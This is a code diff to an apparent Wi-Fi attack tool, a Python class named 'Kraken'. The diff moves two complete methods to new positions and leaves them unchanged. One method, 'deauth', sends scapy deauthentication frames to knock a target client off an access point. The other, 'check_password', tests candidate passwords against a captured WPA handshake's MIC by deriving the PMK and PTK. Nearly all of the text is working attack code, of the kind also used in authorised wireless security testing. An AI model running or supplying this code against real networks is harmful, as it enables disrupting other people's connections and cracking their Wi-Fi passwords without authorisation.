@@ -295,102 +295,6 @@ class Kraken:
             else:
                 print("\nAwaiting handshake packets... Try a deauth.")
 
-    def check_password(
-        self,
-        password: str,
-        ssid: bytes,
-        ap: bytes,
-        client: bytes,
-        anonce: bytes,
-        snonce: bytes,
-        mic: bytes,
-        eapol: bytes,
-    ) -> bool:
-        """
-        Check if the provided password matches the MIC.
-
-        Args:
-            password (str): Password to test.
-            ssid (bytes): SSID of the network.
-            ap (bytes): BSSID of the access point.
-            client (bytes): MAC address of the client.
-            anonce (bytes): ANonce from the handshake.
-            snonce (bytes): SNonce from the handshake.
-            mic (bytes): MIC from the handshake.
-            eapol (bytes): EAPOL packet from the handshake.
-
-        Returns:
-            bool: Password if the MIC matches, False otherwise.
-        """
-        pmk = hashlib.pbkdf2_hmac("sha1", password.encode(), ssid, 4096, 32)
-
-        A = b"Pairwise key expansion"
-        B = (
-            min(ap, client)
-            + max(ap, client)
-            + min(anonce, snonce)
-            + max(anonce, snonce)
-        )
-        ptk = self.PRF512(pmk, A, B)
-        mic_key = ptk[:16]
-        eapol_zeroed = bytearray(eapol)
-        eapol_zeroed[81:97] = b"\x00" * 16
-        new_mic = hmac.new(mic_key, eapol_zeroed, hashlib.sha1).digest()[:16]
-
-        if new_mic == mic:
-            return password
-
-        return False
-
-    def deauth(self, iface: str, target_bssid: str, client: str, pkts: int):
-        """
-        Send deauthentication packets to a target client or broadcast.
-
-        Args:
-            iface (str): Network interface to send packets on.
-            target_bssid (str): BSSID of the target access point.
-            client (str): MAC address of the target client.
-            pkts (int): Number of deauth packets to send.
-        """
-        os.system("clear")
-
-        def handler(pkt: Packet) -> bool:
-            if pkt.haslayer(Dot11Beacon):
-                if (
-                    pkt.addr1.lower() == client.lower()
-                    and pkt.addr2.lower() == target_bssid.lower()
-                ):
-                    return True
-
-            return False
-
-        print(f"Waiting for beacon frame...", end="\r", flush=True)
-
-        if not sniff(iface=iface, stop_filter=handler, timeout=5):
-            print(
-                f"[{RED}x{RESET}] No beacon frame received for: {target_bssid.upper()}"
-            )
-
-            return
-
-        print(f"Sending Deauth to: {client.upper()} on AP: {target_bssid.upper()}")
-        print("─" * 65)
-
-        dot11 = Dot11(
-            type=0,
-            subtype=12,
-            addr1=client,
-            addr2=target_bssid,
-            addr3=target_bssid,
-        )
-        pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)
-
-        for i in range(1, pkts + 1):
-            sendp(pkt, iface=iface, verbose=0)
-            print(f"   → Sent {i}/{pkts} deauth packets", end="\r", flush=True)
-
-        print(f"\n\n{GREEN}Deauth attack complete.{RESET}")
-
     def dump_networks(self, iface: str, target_bssid: str = None, channel: int = None):
         """
         Sniff Wi-Fi networks and display their details. If a target BSSID and channel are provided,
@@ -515,6 +419,102 @@ class Kraken:
 
             self.channel_hopper(iface, 0.25)
             sniff(iface=iface, prn=handler)
+
+    def deauth(self, iface: str, target_bssid: str, client: str, pkts: int):
+        """
+        Send deauthentication packets to a target client or broadcast.
+
+        Args:
+            iface (str): Network interface to send packets on.
+            target_bssid (str): BSSID of the target access point.
+            client (str): MAC address of the target client.
+            pkts (int): Number of deauth packets to send.
+        """
+        os.system("clear")
+
+        def handler(pkt: Packet) -> bool:
+            if pkt.haslayer(Dot11Beacon):
+                if (
+                    pkt.addr1.lower() == client.lower()
+                    and pkt.addr2.lower() == target_bssid.lower()
+                ):
+                    return True
+
+            return False
+
+        print(f"Waiting for beacon frame...", end="\r", flush=True)
+
+        if not sniff(iface=iface, stop_filter=handler, timeout=5):
+            print(
+                f"[{RED}x{RESET}] No beacon frame received for: {target_bssid.upper()}"
+            )
+
+            return
+
+        print(f"Sending Deauth to: {client.upper()} on AP: {target_bssid.upper()}")
+        print("─" * 65)
+
+        dot11 = Dot11(
+            type=0,
+            subtype=12,
+            addr1=client,
+            addr2=target_bssid,
+            addr3=target_bssid,
+        )
+        pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)
+
+        for i in range(1, pkts + 1):
+            sendp(pkt, iface=iface, verbose=0)
+            print(f"   → Sent {i}/{pkts} deauth packets", end="\r", flush=True)
+
+        print(f"\n\n{GREEN}Deauth attack complete.{RESET}")
+
+    def check_password(
+        self,
+        password: str,
+        ssid: bytes,
+        ap: bytes,
+        client: bytes,
+        anonce: bytes,
+        snonce: bytes,
+        mic: bytes,
+        eapol: bytes,
+    ) -> bool:
+        """
+        Check if the provided password matches the MIC.
+
+        Args:
+            password (str): Password to test.
+            ssid (bytes): SSID of the network.
+            ap (bytes): BSSID of the access point.
+            client (bytes): MAC address of the client.
+            anonce (bytes): ANonce from the handshake.
+            snonce (bytes): SNonce from the handshake.
+            mic (bytes): MIC from the handshake.
+            eapol (bytes): EAPOL packet from the handshake.
+
+        Returns:
+            bool: Password if the MIC matches, False otherwise.
+        """
+        pmk = hashlib.pbkdf2_hmac("sha1", password.encode(), ssid, 4096, 32)
+
+        A = b"Pairwise key expansion"
+        B = (
+            min(ap, client)
+            + max(ap, client)
+            + min(anonce, snonce)
+            + max(anonce, snonce)
+        )
+        ptk = self.PRF512(pmk, A, B)
+        mic_key = ptk[:16]
+        eapol_zeroed = bytearray(eapol)
+        eapol_zeroed[81:97] = b"\x00" * 16
+        new_mic = hmac.new(mic_key, eapol_zeroed, hashlib.sha1).digest()[:16]
+
+        if new_mic == mic:
+            return password
+
+        return False
 
     def crack_handshake(self, wordlist: str, handshake: str):
         """
